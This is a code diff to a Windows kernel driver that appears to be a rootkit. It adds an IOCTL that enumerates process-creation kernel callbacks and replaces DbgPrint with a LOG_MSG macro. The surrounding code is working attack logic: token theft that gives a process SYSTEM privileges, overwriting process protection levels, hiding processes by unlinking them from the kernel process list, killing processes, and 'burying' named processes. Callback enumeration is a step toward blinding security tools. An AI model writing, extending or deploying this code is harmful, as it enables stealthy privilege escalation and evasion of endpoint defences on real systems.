@@ -9,6 +9,8 @@
 #include "WinTypes.hpp"
 #include "KernelCallbacks.hpp"
 #include "AddressUtils.hpp"
+#include "Vector.hpp"
+#include "CallbackUtils.hpp"
 
 // --------------------------------------------------------------------------------------------------------
 // IOCTLs 
@@ -30,6 +32,14 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
 
 #define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+#define BE_IOCTL_ENUMERATE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+typedef struct _CALLBACK_DATA {
+    UINT64 driverBase;
+    UINT64 offset;
+    WCHAR driverName[64];
+} CALLBACK_DATA;
+
 // --------------------------------------------------------------------------------------------------------
 
 NTSTATUS BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp);
@@ -40,6 +50,7 @@ NTSTATUS BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize);
 NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);
 NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlHideProcess(HANDLE pid);
+NTSTATUS BeIoctlEnumerateCallbacks(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -55,7 +66,7 @@ NTSTATUS
 BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 {
     UNREFERENCED_PARAMETER(DeviceObject);
-    DbgPrint("BeIoControl Called \r\n");
+    LOG_MSG("BeIoControl Called \r\n");
 
     NTSTATUS status = STATUS_NOT_SUPPORTED;
     PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);;
@@ -110,6 +121,12 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
                 status = BeIoctlHideProcess(ULongToHandle(targetPid));
             }
             break;
+
+        case BE_IOCTL_ENUMERATE_CALLBACKS:
+            {
+                status = BeIoctlEnumerateCallbacks(Irp, pIoStackIrp, &dwDataWritten);
+            }
+            break;
         }
     }
 
@@ -132,7 +149,7 @@ BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
 {
     UNREFERENCED_PARAMETER(pDeviceObject);
     UNREFERENCED_PARAMETER(Irp);
-    DbgPrint("Unsupported function Called \r\n");
+    LOG_MSG("Unsupported function Called \r\n");
     return STATUS_SUCCESS;
 }
 
@@ -141,6 +158,7 @@ BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
  *
  * @param Irp Pointer to the IO Request Packet (IRP)
  * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
+ * @param pdwDataWritten pointer to an ULONG containing the bytes written to the outBuffer
  * @return NTSTATUS status code.
  */
 NTSTATUS
@@ -181,7 +199,7 @@ BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritte
 NTSTATUS
 BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
 {
-    DbgPrint("Changing pid %i protection to %i", pid, newProtectionLevel);
+    LOG_MSG("Changing pid %i protection to %i", pid, newProtectionLevel);
 
     // Lookup process
     PEPROCESS process = BeGetEprocessByPid(pid);
@@ -192,12 +210,12 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
 
     ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();
 
-    DbgPrint("Current protection level: %i", *((BYTE*)(EProtectionLevel)));
+    LOG_MSG("Current protection level: %i", *((BYTE*)(EProtectionLevel)));
 
     // assign new protection level
     *((BYTE*)(EProtectionLevel)) = newProtectionLevel;
 
-    DbgPrint("New protection level: %i", *((BYTE*)(EProtectionLevel)));
+    LOG_MSG("New protection level: %i", *((BYTE*)(EProtectionLevel)));
 
     return STATUS_SUCCESS;
 }
@@ -212,27 +230,27 @@ BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
 {
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
 
-    DbgPrint("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
+    LOG_MSG("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
     __try
     {
         // Check alignment
         if (dwSize % sizeof(WCHAR) != 0)
         {
-            DbgPrint("Invalid alignment \r\n");
+            LOG_MSG("Invalid alignment \r\n");
             return STATUS_INVALID_BUFFER_SIZE;
         }
 
         if (!processToBury)
         {
-            DbgPrint("Empty buffer \r\n");
+            LOG_MSG("Empty buffer \r\n");
             return STATUS_INVALID_PARAMETER;
         }
 
-        DbgPrint("String received: %ws \r\n", processToBury);
+        LOG_MSG("String received: %ws \r\n", processToBury);
 
         if (BeIsStringTerminated(processToBury, dwSize) == FALSE)
         {
-            DbgPrint("Not null terminated! \r\n");
+            LOG_MSG("Not null terminated! \r\n");
             return STATUS_UNSUCCESSFUL;
         }
 
@@ -250,11 +268,11 @@ BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
         
         if (NtStatus == STATUS_SUCCESS)
         {
-            DbgPrint("Added routine!\n");
+            LOG_MSG("Added routine!\n");
         }
         else
         {
-            DbgPrint("Failed to add routine! Error: %i\n", NtStatus);
+            LOG_MSG("Failed to add routine! Error: %i\n", NtStatus);
         }
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
@@ -282,7 +300,7 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
     if (NtStatus != 0)
     {
-        DbgPrint("PID %i not found", HandleToUlong(pid));
+        LOG_MSG("PID %i not found", HandleToUlong(pid));
         return NtStatus;
     }
 
@@ -290,12 +308,12 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
     if (NtStatus != 0)
     {
-        DbgPrint("System process not found with pid 4");
+        LOG_MSG("System process not found with pid 4");
         return NtStatus;
     }
 
-    //DbgPrint("Token Target: %i", (ULONG)targetProcess + tokenOffset);
-    //DbgPrint("Token System: %i", (ULONG)privilegedProcess + tokenOffset);
+    //LOG_MSG("Token Target: %i", (ULONG)targetProcess + tokenOffset);
+    //LOG_MSG("Token System: %i", (ULONG)privilegedProcess + tokenOffset);
 
     // Replace target process token with system token
     *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);
@@ -335,7 +353,7 @@ BeIoctlKillProcess(HANDLE pid)
     NTSTATUS NtStatus = ZwTerminateProcess(hProcess, 0);
     ZwClose(hProcess);
 
-    DbgPrint("KillProcess %i \r\n", NtStatus);
+    LOG_MSG("KillProcess %i \r\n", NtStatus);
     return NtStatus;
 }
 
@@ -356,4 +374,66 @@ BeIoctlHideProcess(HANDLE pid)
     PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
     RemoveEntryList(processListEntry);
     return STATUS_SUCCESS;
+}
+
+/**
+ * Enumerates kernel callbacks
+ *
+ * @param Irp Pointer to the IO Request Packet (IRP)
+ * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
+ * @param pdwDataWritten pointer to an ULONG containing the bytes written to the outBuffer
+ * @return NTSTATUS status code.
+ */
+NTSTATUS
+BeIoctlEnumerateCallbacks(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
+{
+    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
+    LOG_MSG("IOCTL enumerate callbacks");
+
+    __try
+    {
+        CALLBACK_DATA* pOutputBuffer = (CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
+
+        // find callbacks
+        auto callbackVector = BeEnumerateKernelCallbacks_ProcessCreate();
+
+        // setup buffer
+        ULONG dwDataSize = callbackVector.size() * sizeof(CALLBACK_DATA);
+
+        if (pOutputBuffer)
+        {
+            if (pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength >= dwDataSize) // Output buffer should be big enough
+            {
+                // write buffer to output buffer
+                for (INT i = 0; i < callbackVector.size(); ++i)
+                {
+                    RtlCopyMemory(&(pOutputBuffer[i].driverBase), &(callbackVector[i].driverBase), sizeof(UINT64));
+                    RtlCopyMemory(&(pOutputBuffer[i].offset), &(callbackVector[i].offset), sizeof(UINT64));
+                    if (!BeIsStringNull(callbackVector[i].driverName))
+                    {
+                        SIZE_T strLen = wcslen(callbackVector[i].driverName) + 1;
+                        DbgPrint("Size: %i of %ws", strLen, callbackVector[i].driverName);
+                        RtlCopyMemory(&(pOutputBuffer[i].driverName), callbackVector[i].driverName, strLen * sizeof(WCHAR));
+                    }
+                }
+
+                LOG_MSG("Copied");
+
+                //RtlCopyMemory(pOutputBuffer, pOutputBuffer, dwDataSize);
+                *pdwDataWritten = dwDataSize;
+                NtStatus = STATUS_SUCCESS;
+            }
+            else
+            {
+                *pdwDataWritten = 0;
+                NtStatus = STATUS_BUFFER_TOO_SMALL;
+            }
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        NtStatus = GetExceptionCode();
+    }
+
+    return NtStatus;
 }
